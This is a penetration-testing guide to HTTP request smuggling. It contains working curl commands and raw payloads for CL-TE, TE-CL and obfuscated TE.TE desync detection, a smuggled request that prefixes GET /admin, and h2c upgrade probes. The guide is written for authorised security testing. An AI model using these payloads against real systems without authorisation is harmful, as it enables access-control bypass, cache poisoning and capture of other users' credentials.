# HTTP Request Smuggling Testing

## Objective

Identify desynchronization vulnerabilities between frontend proxy/load balancer and backend server in how they parse HTTP request boundaries — enabling request smuggling that can bypass security controls, poison caches, hijack requests, or perform SSRF.

---

## 1. Background

HTTP/1.1 supports two methods to specify request body length:
- `Content-Length: N` (byte count)
- `Transfer-Encoding: chunked` (body terminated with `0\r\n\r\n`)

**Vulnerability exists when:**
- Frontend uses `Content-Length` but backend uses `Transfer-Encoding` (CL-TE)
- Frontend uses `Transfer-Encoding` but backend uses `Content-Length` (TE-CL)
- Both process conflicting headers differently

---

## 2. Prerequisite Detection

```bash
# Check if HTTP/1.1 is used (smuggling typically requires HTTP/1.1)
curl -si --http1.1 https://target/ | grep -iE "HTTP|server|transfer-encoding"

# Check if frontend is a reverse proxy
curl -si https://target/ | grep -iE "via:|x-forwarded|x-real-ip|cf-ray|x-cache"

# Identify backend server type (may differ from frontend)
curl -si https://target/ | grep -iE "server:|x-powered-by"
```

---

## 3. CL-TE Vulnerability Detection

Frontend uses `Content-Length`, backend uses `Transfer-Encoding`.

### Safe Detection — Timing Technique
```bash
# This request should cause a 10+ second delay if vulnerable
# (backend hangs waiting for next chunk after '0' is processed by frontend)
curl -si --http1.1 -X POST https://target/ \
  -H "Content-Length: 6" \
  -H "Transfer-Encoding: chunked" \
  -d $'0\r\n\r\nX' \
  --max-time 15 \
  -w "\nTime: %{time_total}s\n"
```

**Vulnerable (CL-TE):** Response takes 10+ seconds (backend waiting for second request body).

---

## 4. TE-CL Vulnerability Detection

Frontend uses `Transfer-Encoding`, backend uses `Content-Length`.

### Safe Detection — Timing Technique
```bash
# This should cause delay if vulnerable
curl -si --http1.1 -X POST https://target/ \
  -H "Transfer-Encoding: chunked" \
  -H "Content-Length: 6" \
  -d $'3\r\nabc\r\n0\r\n\r\n' \
  --max-time 15 \
  -w "\nTime: %{time_total}s\n"
```

---

## 5. TE.TE — Obfuscated Transfer-Encoding

Both frontend and backend support `Transfer-Encoding` but handle obfuscation differently:

```bash
# Test with obfuscated Transfer-Encoding header
curl -si --http1.1 -X POST https://target/ \
  -H "Transfer-Encoding: xchunked" \
  -H "Transfer-Encoding: chunked" \
  --max-time 10

# Other obfuscation variants to test:
# Transfer-Encoding: chunked
# Transfer-Encoding : chunked      (space before colon)
# X-Transfer-Encoding: chunked
# Transfer-Encoding: Chunked       (capital C)
# Transfer-Encoding: chunked, identity
```

---

## 6. Confirm with Differential Response (Safe Method)

> **Important:** All confirmation tests must use your own session only. Never inject content that targets other users' requests.

### CL-TE Confirmation
```bash
# Send ambiguous request — if vulnerable, the "G" prefix is prepended to the next request
# Use only test endpoints you control both requests on

# Request 1 (attacker sends):
POST / HTTP/1.1
Host: target.com
Content-Length: 36
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
X-Ignore: X

# Request 2 (attacker's own follow-up request):
POST / HTTP/1.1
Host: target.com
Content-Length: 4

abcd
```

This is done safely in Burp Suite's HTTP Request Smuggler extension.

---

## 7. Automated Scanning

```bash
# Use Burp Suite's "HTTP Request Smuggler" extension
# Navigate to: Extensions → BApp Store → HTTP Request Smuggler
# Send target URL to the extension scanner

# Or use smuggler.py (Portswigger tool)
python3 smuggler.py -u https://target/ -v
```

---

## 8. Desync Impact Examples (Documentation Only)

These are the attack scenarios to document in findings — do NOT actively exploit against other users:

**Cache Poisoning via Smuggling:**
```
Attacker smuggles a request that poisons the cache for /home
Subsequent victims requesting /home get the attacker's cached response
```

**Credential Capture:**
```
Attacker smuggles partial request headers
Victim's next request body (with credentials) appended to attacker's request
Attacker reads credentials from error response
```

**Bypass Front-End Security Controls:**
```
Access control enforced at load balancer but not backend
Smuggled request bypasses load balancer → reaches backend directly
```

---

## 9. HTTP/2 Downgrade Smuggling

H2C (HTTP/2 cleartext) downgrade:

```bash
# Test if server accepts HTTP/2 downgrade via h2c upgrade
curl -si --http2 https://target/ | grep -iE "upgrade|h2c|HTTP"

# Some servers accept HTTP/1.1 upgrade requests that can be smuggled
curl -si https://target/ \
  -H "Upgrade: h2c" \
  -H "HTTP2-Settings: AAMAAABkAAQAAP__" \
  -H "Connection: Upgrade, HTTP2-Settings" | grep -iE "upgrade|switching|101"
```

---

## Evidence to Capture

- Timing evidence (10+ second delay when smuggling request is sent)
- Burp Suite HTTP Request Smuggler extension output
- The differential response showing the smuggled prefix was prepended
- Server/proxy header information confirming multi-layer architecture

---

## Findings Reference

| Test | Result | Severity |
|---|---|---|
| CL-TE desync confirmed (timing) | Pass/Fail | High-Critical |
| TE-CL desync confirmed (timing) | Pass/Fail | High-Critical |
| TE.TE via obfuscation | Pass/Fail | High |
| H2C upgrade accepted | Pass/Fail | Medium-High |
| Security control bypass via smuggling | Pass/Fail | Critical |
